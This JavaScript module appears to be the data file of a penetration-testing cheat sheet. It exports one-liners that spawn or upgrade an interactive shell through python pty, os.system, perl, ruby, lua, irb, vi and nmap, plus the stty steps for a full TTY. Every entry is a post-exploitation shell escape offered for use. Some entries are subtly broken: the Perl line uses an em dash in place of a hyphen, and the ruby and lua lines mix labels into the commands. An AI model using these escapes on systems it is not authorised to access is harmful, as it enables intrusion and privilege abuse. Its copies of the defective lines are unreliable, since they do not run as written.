module.exports={'Python2 spawn shell ':`python -c 'import pty; pty.spawn("/bin/bash")'`,
'Fully Interactive TTY python3':`python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl + Z
stty raw -echo; fg
stty rows 38 columns 116`,
'OS system spawn shell':`echo os.system("/bin/bash")`,
'Bash spawn shell':'/bin/sh -i',
'Perl spawn shell': `perl —e 'exec "/bin/sh";'`,
'Ruby spawn shell':'ruby: exec "/bin/sh"',
'Lua spawn shell':'lua: os.execute("/bin/sh")',
'IRB spawn shell':'exec "/bin/sh"',
'VI spawn shell':':!bash',
'VI(2) spawn shell':':set shell=/bin/bash:shell',
'Nmap spawn shell':'!sh'
};
